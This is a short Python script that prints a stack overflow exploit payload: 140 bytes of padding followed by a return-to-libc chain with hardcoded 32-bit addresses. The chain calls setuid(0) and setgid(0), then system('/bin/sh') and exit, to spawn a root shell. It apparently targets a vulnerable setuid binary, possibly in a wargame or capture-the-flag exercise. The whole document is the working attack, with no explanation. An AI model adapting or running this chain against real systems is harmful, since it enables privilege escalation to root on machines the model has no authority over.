```python
#! /usr/bin/python
import sys
import struct

def p(v):
  return struct.pack('I', v)

payload = "A" * 140
payload += p(0xb7e403c0)         # setuid
payload += p(0x8049022)          # popret
payload += p(0x0)                # uid 0
payload += p(0xb7e403c0)         # setgid
payload += p(0x8049022)          # popret
payload += p(0x0)                # gid 0
payload += p(0xb7dc9db0)         # system
payload += p(0xb7dbd9e0)         # exit
payload += p(0xb7eeab2b)         # /bin/sh

print payload
```
